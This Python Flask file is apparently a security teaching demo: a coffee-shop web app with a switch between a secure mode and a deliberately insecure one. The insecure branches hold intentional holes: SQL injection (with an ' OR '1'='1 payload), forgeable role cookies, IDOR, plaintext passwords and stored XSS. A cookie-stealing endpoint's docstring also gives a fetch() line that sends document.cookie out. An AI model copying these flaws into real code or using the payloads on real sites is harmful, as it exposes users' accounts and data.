import os
import sqlite3
import base64
import bcrypt
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, make_response, session, flash, jsonify

import config

app = Flask(__name__)
app.secret_key = config.SECRET_KEY

# Configure Session Cookie security based on SECURITY_MODE
if config.SECURITY_MODE:
    app.config.update(
        SESSION_COOKIE_HTTPONLY=True,
        SESSION_COOKIE_SECURE=True,  # Required for HTTPS
        SESSION_COOKIE_SAMESITE='Strict'
    )
else:
    # In insecure mode, we explicitly disable secure cookie flags
    app.config.update(
        SESSION_COOKIE_HTTPONLY=False,
        SESSION_COOKIE_SECURE=False,
        SESSION_COOKIE_SAMESITE=None
    )

# Configure Session Timeout (30 seconds check, but keep session lifetime larger so manual timeout check can display warning)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=15)

@app.before_request
def check_session_timeout():
    if not request.endpoint or request.endpoint in ['static', 'login', 'register', 'logout', 'log_cookie']:
        return

    now = datetime.now().timestamp()

    if config.SECURITY_MODE:
        session.permanent = True
        if 'username' in session:
            last_active = session.get('last_active')
            if last_active and now - last_active > 90:
                session.clear()
                flash("Sesi Anda telah berakhir (90 detik tidak aktif).", "warning")
                return redirect(url_for('login'))
            session['last_active'] = now
    else:
        username = request.cookies.get('session_user')
        if username:
            last_active_cookie = request.cookies.get('session_last_active')
            if last_active_cookie:
                try:
                    elapsed = now - float(last_active_cookie)
                    if elapsed > 90:
                        resp = make_response(redirect(url_for('login')))
                        resp.delete_cookie('session_user')
                        resp.delete_cookie('session_role')
                        resp.delete_cookie('session_last_active')
                        flash("Sesi Anda telah berakhir (30 detik tidak aktif).", "warning")
                        return resp
                except ValueError:
                    pass

@app.after_request
def update_last_active(response):
    # Update last active time for cookie in insecure mode
    if not config.SECURITY_MODE:
        username = request.cookies.get('session_user')
        # Only set if user is logged in and response is not redirecting/logging out
        if username and response.status_code != 302:
            response.set_cookie('session_last_active', str(datetime.now().timestamp()))
    return response

# Attack log for XSS cookie stealing demonstration
attack_log = []

# --- DATABASE SETUP ---
def get_db_connection():
    conn = sqlite3.connect(config.DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    if not os.path.exists(config.DATABASE):
        print("Initializing database...")
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Create Users Table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                role TEXT NOT NULL
            )
        ''')
        
        # Create Products Table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                description TEXT NOT NULL,
                price INTEGER NOT NULL,
                image_url TEXT NOT NULL
            )
        ''')
        
        # Create Orders Table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS orders (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                username TEXT NOT NULL,
                items TEXT NOT NULL,
                total_price INTEGER NOT NULL,
                order_date TEXT NOT NULL,
                FOREIGN KEY (user_id) REFERENCES users (id)
            )
        ''')
        
        # Create Reviews Table (XSS Vector)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS reviews (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                product_id INTEGER NOT NULL,
                username TEXT NOT NULL,
                comment TEXT NOT NULL,
                review_date TEXT NOT NULL,
                FOREIGN KEY (product_id) REFERENCES products (id)
            )
        ''')
        
        # Seed Products
        products = [
            ("Espresso Solo", "Kopi hitam pekat murni yang diekstrak dengan tekanan tinggi. Kuat dan aromatik.", 25000, "/static/images/espresso.jpg"),
            ("Cafe Latte", "Perpaduan espresso premium dengan susu hangat lembut dan lapisan busa tipis.", 35000, "/static/images/latte.jpg"),
            ("Cappuccino", "Kopi klasik Italia dengan rasio espresso, susu hangat, dan busa susu tebal yang seimbang.", 35000, "/static/images/cappuccino.jpg"),
            ("Caramel Macchiato", "Espresso dengan sirup caramel manis, susu hangat, dan saus karamel di atasnya.", 42000, "/static/images/macchiato.jpg"),
            ("Dark Mocha Fudge", "Kombinasi espresso, cokelat pekat premium, susu, dan whipped cream lembut.", 40000, "/static/images/mocha.jpg"),
            ("Nitro Cold Brew", "Kopi cold brew yang diinfus nitrogen untuk tekstur super lembut seperti bir.", 38000, "/static/images/coldbrew.jpg")
        ]
        cursor.executemany('INSERT INTO products (name, description, price, image_url) VALUES (?, ?, ?, ?)', products)
        
        # Seed Users
        # 1. Admin account:
        # Plain: admin_123
        # Bcrypt Hash: $2b$12$R.SDFX3Zqj1f/gM6R1bNfeH5VvQ5QxZ2kC56s7hP1U8R/N3vR/t6u
        admin_pass_bcrypt = bcrypt.hashpw(b"admin_123", bcrypt.gensalt()).decode('utf-8')
        
        # 2. Customer account:
        # Plain: customer_123
        # Bcrypt Hash: $2b$12$ZtF.o/x5eF5Q/YFp4C/WSe7eNlX8o5cM8M8zXF9XQ2K9uR/H/wF1.
        customer_pass_bcrypt = bcrypt.hashpw(b"customer_123", bcrypt.gensalt()).decode('utf-8')
        
        # Insert admin user
        # Depending on security mode, it will be stored differently. But since the DB is created once,
        # we will store BOTH plain-text and hashed passwords in different records or just seed both.
        # Let's seed:
        # - admin (pass: admin_123)
        # - customer (pass: customer_123)
        # In secure mode we verify with bcrypt, in insecure we verify with plaintext match.
        # So we can store both hashed and plain? Wait, if security mode is toggled, it's better to store
        # the plain password or the bcrypt password.
        # Let's write the seed such that we store the appropriate version. Actually, let's create two accounts of each:
        # We can store:
        # admin -> admin_123 (if insecure) / bcrypt (if secure)
        # Let's seed them based on the initial SECURITY_MODE.
        # But wait! If the user toggles SECURITY_MODE at runtime in config.py, the DB already exists!
        # So, we should store BOTH types or handle it.
        # A simpler way: we store the password in plaintext in the DB during creation, OR we can store them hashed.
        # Wait, if we want to show password hashing:
        # In Insecure Mode, registration saves in plain text, and login checks plaintext.
        # In Secure Mode, registration saves in bcrypt, and login checks bcrypt.
        # For seed users, we can store:
        # - admin: password = "admin_123" (plaintext)
        # - customer: password = "customer_123" (plaintext)
        # Wait, if SECURITY_MODE is True, bcrypt check will fail on "admin_123" plaintext unless we hash it.
        # To make it work seamlessly when toggling:
        # In login check:
        # - If secure mode: we check if password starts with '$2b$' (bcrypt hash format) and verify it. If it doesn't start with it (meaning it's plain text from insecure registration), we can either reject it or check plaintext. For a real representation, let's say the admin is registered. We can seed the users with:
        #   - Username: admin (password: admin_123)
        #   - Username: customer (password: customer_123)
        # We will write the login check:
        # - In secure mode: it checks using bcrypt.checkpw().
        # - In insecure mode: it checks using plain comparison `password = input`.
        # To make seed users work in secure mode, we should seed their passwords as bcrypt hashes, but if they login in insecure mode, bcrypt check won't run, it checks plain. But if the DB has bcrypt hashes, login in insecure mode with "admin_123" will fail because the DB contains the hash string, not "admin_123".
        # Ah! That is a very interesting detail!
        # What if we seed the DB with two separate admin accounts? Or we can just seed them with bcrypt hashes, and if in insecure mode, we check if the stored password matches plain OR hash. Or we can just seed them with plain text "admin_123" if config.SECURITY_MODE is False, and bcrypt if True.
        # Let's do this: during database initialization, if SECURITY_MODE is True, we write bcrypt hashes. If SECURITY_MODE is False, we write plaintext.
        # Also, if we change SECURITY_MODE, we can provide a small helper or just re-create the database, or we can write the login verification to handle both:
        # "If the stored password is a hash (starts with $2b$), use bcrypt. If it is plain text, use plain comparison (or if SECURITY_MODE is False, just do plain comparison)."
        # Actually, let's write a robust password verification helper:
        # - In secure mode: we check if the password in DB is hashed. If it is, we checkpw. If not, we fail (representing that plain-text passwords are not allowed or cannot be verified).
        # - In insecure mode: we check plain-text comparison.
        # Let's seed the DB with:
        # - admin: if SECURITY_MODE is True, password is the bcrypt hash of "admin_123". If False, password is "admin_123".
        # - customer: if SECURITY_MODE is True, password is the bcrypt hash of "customer_123". If False, password is "customer_123".
        # This is perfect! Let's write the seed logic accordingly.
        
        if config.SECURITY_MODE:
            p_admin = admin_pass_bcrypt
            p_cust = customer_pass_bcrypt
        else:
            p_admin = "admin_123"
            p_cust = "customer_123"
            
        cursor.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)', ('admin', p_admin, 'admin'))
        cursor.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)', ('customer', p_cust, 'user'))
        
        # Seed a review to show XSS (insecure mode review will contain XSS payload ready to use, or they can submit it themselves)
        conn.commit()
        conn.close()
        print("Database initialized successfully.")

# Initialize the database on load
init_db()


# --- HELPER FUNCTIONS ---
def get_current_user():
    """
    Get current logged in user from session/cookie.
    Secure mode: Uses Flask's secure session.
    Insecure mode: Checks a plain cookie `session_user` which can be easily forged.
    """
    if config.SECURITY_MODE:
        # Secure: read from signed session
        username = session.get('username')
        if not username:
            return None
        
        conn = get_db_connection()
        user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        conn.close()
        return user
    else:
        # Insecure: read from plain cookie (vulnerable to Session Hijacking / Forgery)
        username = request.cookies.get('session_user')
        if not username:
            return None
        
        conn = get_db_connection()
        # Insecure: fetch user by name. We don't even check signature because there is none!
        user = conn.execute(f"SELECT * FROM users WHERE username = '{username}'").fetchone()
        conn.close()
        return user

def admin_required(f):
    """
    Decorator to protect admin routes.
    """
    from functools import wraps
    @wraps(f)
    def decorated_function(*args, **kwargs):
        user = get_current_user()
        
        if config.SECURITY_MODE:
            # Secure RBAC: strictly verify in database and session role
            if not user or user['role'] != 'admin':
                return render_template('error.html', message="403 Forbidden: Anda tidak memiliki akses ke halaman ini."), 403
        else:
            # Insecure RBAC:
            # Maybe it checks cookie `session_role` which can be forged.
            # Or if security mode is False, we check if the user is admin, but if the user spoofed their cookie to 'admin', it will pass.
            # Let's say it checks `request.cookies.get('session_role') == 'admin'`. Anyone can set this cookie!
            role = request.cookies.get('session_role')
            if role != 'admin' and (not user or user['role'] != 'admin'):
                # Insecure error, but if they set cookie `session_role=admin`, they get in!
                return render_template('error.html', message="403 Forbidden: Anda bukan admin (Coba tambahkan cookie session_role=admin atau ubah session_user=admin)."), 403
                
        return f(*args, **kwargs)
    return decorated_function


# --- ROUTES ---

@app.route('/')
def index():
    user = get_current_user()
    conn = get_db_connection()
    featured_products = conn.execute('SELECT * FROM products LIMIT 3').fetchall()
    conn.close()
    return render_template('index.html', user=user, featured=featured_products)

@app.route('/menu')
def menu():
    user = get_current_user()
    conn = get_db_connection()
    products = conn.execute('SELECT * FROM products').fetchall()
    
    # Fetch reviews for all products
    products_with_reviews = []
    for product in products:
        p_dict = dict(product)
        reviews = conn.execute('SELECT * FROM reviews WHERE product_id = ? ORDER BY id DESC', (product['id'],)).fetchall()
        p_dict['reviews'] = [dict(r) for r in reviews]
        products_with_reviews.append(p_dict)
        
    conn.close()
    
    # We pass SECURITY_MODE to template to toggle safe/unsafe rendering of comments
    return render_template('menu.html', user=user, products=products_with_reviews, security_mode=config.SECURITY_MODE)

@app.route('/add_review', methods=['POST'])
def add_review():
    user = get_current_user()
    if not user:
        flash("Anda harus login untuk mengirim ulasan.", "danger")
        return redirect(url_for('login'))
        
    product_id = request.form.get('product_id')
    comment = request.form.get('comment')
    username = user['username']
    
    if not comment or not product_id:
        flash("Ulasan tidak boleh kosong.", "danger")
        return redirect(url_for('menu'))
        
    conn = get_db_connection()
    # In insecure mode, we might allow SQL injection here too, but the main goal is XSS.
    # We insert directly. Secure or Insecure, it is stored. The vulnerability lies in how it's RENDERED.
    # In secure mode, Jinja escapes it. In insecure, EJS/Jinja uses |safe filter.
    conn.execute('INSERT INTO reviews (product_id, username, comment, review_date) VALUES (?, ?, ?, ?)',
                 (product_id, username, comment, datetime.now().strftime("%Y-%m-%d %H:%M")))
    conn.commit()
    conn.close()
    
    flash("Ulasan berhasil ditambahkan!", "success")
    return redirect(url_for('menu'))

@app.route('/cart')
def cart_page():
    user = get_current_user()
    return render_template('cart.html', user=user)

@app.route('/checkout', methods=['POST'])
def checkout():
    user = get_current_user()
    if not user:
        return jsonify({"success": False, "message": "Silakan login terlebih dahulu."}), 401
        
    data = request.get_json()
    if not data or 'items' not in data or 'total' not in data:
        return jsonify({"success": False, "message": "Data tidak valid."}), 400
        
    items_str = ", ".join([f"{item['name']} ({item['quantity']}x)" for item in data['items']])
    total_price = data['total']
    
    conn = get_db_connection()
    conn.execute('INSERT INTO orders (user_id, username, items, total_price, order_date) VALUES (?, ?, ?, ?, ?)',
                 (user['id'], user['username'], items_str, total_price, datetime.now().strftime("%Y-%m-%d %H:%M")))
    conn.commit()
    conn.close()
    
    return jsonify({"success": True, "message": "Pesanan Anda berhasil diproses!"})

@app.route('/dashboard')
def dashboard():
    user = get_current_user()
    if not user:
        flash("Silakan login terlebih dahulu.", "warning")
        return redirect(url_for('login'))
        
    conn = get_db_connection()
    
    # In secure mode: query orders for current user only
    if config.SECURITY_MODE:
        orders = conn.execute('SELECT * FROM orders WHERE user_id = ? ORDER BY id DESC', (user['id'],)).fetchall()
    else:
        # In insecure mode, we might have an IDOR (Insecure Direct Object Reference)
        # where we read orders based on a query parameter or cookie, allowing users to see other users' orders.
        # Let's say user can pass a query parameter `?user_id=X`. If provided, it displays that user's orders!
        user_id_param = request.args.get('user_id')
        if user_id_param:
            orders = conn.execute(f"SELECT * FROM orders WHERE user_id = {user_id_param} ORDER BY id DESC").fetchall()
        else:
            orders = conn.execute(f"SELECT * FROM orders WHERE user_id = {user['id']} ORDER BY id DESC").fetchall()
            
    conn.close()
    return render_template('dashboard.html', user=user, orders=orders, security_mode=config.SECURITY_MODE)

@app.route('/login', methods=['GET', 'POST'])
def login():
    user = get_current_user()
    if user:
        return redirect(url_for('index'))
        
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        conn = get_db_connection()
        
        if not config.SECURITY_MODE:
            # --- INSECURE LOGIN (SQL Injection & Plaintext Password) ---
            # Query is constructed using string interpolation, allowing SQL Injection.
            # Example payload: ' OR '1'='1
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
            print(f"[SQL INJECTION TRY] Query: {query}")
            
            try:
                # Execute the raw query
                user_record = conn.execute(query).fetchone()
                
                if user_record:
                    # Insecure login successful! Set insecure cookies (no HttpOnly, no Secure)
                    resp = make_response(redirect(url_for('index')))
                    resp.set_cookie('session_user', user_record['username'])
                    resp.set_cookie('session_role', user_record['role'])
                    resp.set_cookie('session_last_active', str(datetime.now().timestamp()))
                    conn.close()
                    flash(f"Login sukses (Insecure)! Selamat datang {user_record['username']}.", "success")
                    return resp
                else:
                    flash("Username atau password salah.", "danger")
            except Exception as e:
                # If there's an SQL error, display it (Error-based SQLi helper)
                flash(f"Database Error: {str(e)}", "danger")
            conn.close()
            
        else:
            # --- SECURE LOGIN (Parameterized Query & Bcrypt Verification) ---
            # Using placeholders (?) to prevent SQL Injection
            user_record = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
            conn.close()
            
            if user_record:
                stored_password = user_record['password']
                # Verify bcrypt hash
                try:
                    is_valid = bcrypt.checkpw(password.encode('utf-8'), stored_password.encode('utf-8'))
                except Exception:
                    # Fallback in case a plaintext password remained in DB
                    is_valid = (password == stored_password)
                
                if is_valid:
                    # Secure login successful! Set signed session cookies (with HttpOnly, Secure)
                    session['username'] = user_record['username']
                    session['role'] = user_record['role']
                    session['last_active'] = datetime.now().timestamp()
                    flash(f"Login sukses! Selamat datang {user_record['username']}.", "success")
                    return redirect(url_for('index'))
            
            flash("Username atau password salah.", "danger")
            
    return render_template('login.html', user=None)

@app.route('/register', methods=['GET', 'POST'])
def register():
    user = get_current_user()
    if user:
        return redirect(url_for('index'))
        
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if not username or not password:
            flash("Semua kolom harus diisi.", "danger")
            return redirect(url_for('register'))
            
        conn = get_db_connection()
        # Check if username exists
        existing = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        if existing:
            flash("Username sudah digunakan.", "danger")
            conn.close()
            return redirect(url_for('register'))
            
        if config.SECURITY_MODE:
            # --- SECURE REGISTER (Bcrypt Hashing) ---
            hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
            conn.execute('INSERT INTO users (username, password, role) VALUES (?, ?, ?)', (username, hashed_password, 'user'))
        else:
            # --- INSECURE REGISTER (Plain-text) ---
            conn.execute(f"INSERT INTO users (username, password, role) VALUES ('{username}', '{password}', 'user')")
            
        conn.commit()
        conn.close()
        
        flash("Registrasi berhasil! Silakan login.", "success")
        return redirect(url_for('login'))
        
    return render_template('register.html', user=None)

@app.route('/logout')
def logout():
    # Logout handles both secure and insecure modes
    resp = make_response(redirect(url_for('index')))
    
    # Insecure logout: delete plain cookies
    resp.delete_cookie('session_user')
    resp.delete_cookie('session_role')
    resp.delete_cookie('session_last_active')
    
    # Secure logout: clear Flask session
    session.clear()
    
    flash("Anda telah logout.", "info")
    return resp


# --- ADMIN ROUTE (RBAC Target) ---

@app.route('/admin')
@admin_required
def admin_dashboard():
    user = get_current_user()
    conn = get_db_connection()
    orders = conn.execute('SELECT * FROM orders ORDER BY id DESC').fetchall()
    users = conn.execute('SELECT id, username, password, role FROM users').fetchall()
    conn.close()
    
    # Render with security information for comparison in admin panel
    return render_template('admin.html', user=user, orders=orders, users=users, attack_log=attack_log, security_mode=config.SECURITY_MODE)


# --- EXPLOIT / SECURITY DEMO HELPER ROUTE ---

@app.route('/log-cookie')
def log_cookie():
    """
    Endpoint where XSS payloads send stolen cookies.
    E.g. fetch('https://127.0.0.1:5000/log-cookie?c=' + document.cookie)
    """
    stolen_cookie = request.args.get('c', 'No cookie data')
    ip_addr = request.remote_addr
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Save the incident in memory
    attack_log.append({
        "timestamp": timestamp,
        "ip": ip_addr,
        "cookie": stolen_cookie,
        "user_agent": request.headers.get('User-Agent')
    })
    
    print(f"\n[!!! ATTACK DETECTED !!!] Stolen cookie received from {ip_addr}:")
    print(f"Cookie Content: {stolen_cookie}\n")
    
    return jsonify({"status": "received"})

@app.route('/clear-attack-logs')
@admin_required
def clear_attack_logs():
    global attack_log
    attack_log = []
    flash("Log serangan berhasil dibersihkan.", "success")
    return redirect(url_for('admin_dashboard'))

# Context processor to inject security status globally to templates
@app.context_processor
def inject_security_status():
    return dict(SECURITY_MODE=config.SECURITY_MODE)

# --- RUN THE APP ---
if __name__ == '__main__':
    # Determine protocol based on certificates availability
    if os.path.exists("cert.pem") and os.path.exists("key.pem"):
        print("Running Flask Server with HTTPS/TLS enabled...")
        app.run(
            host=config.HOST,
            port=config.PORT,
            debug=config.DEBUG,
            ssl_context=("cert.pem", "key.pem")
        )
    else:
        print("WARNING: cert.pem or key.pem not found. Running over HTTP.")
        app.run(
            host=config.HOST,
            port=config.PORT,
            debug=config.DEBUG
        )
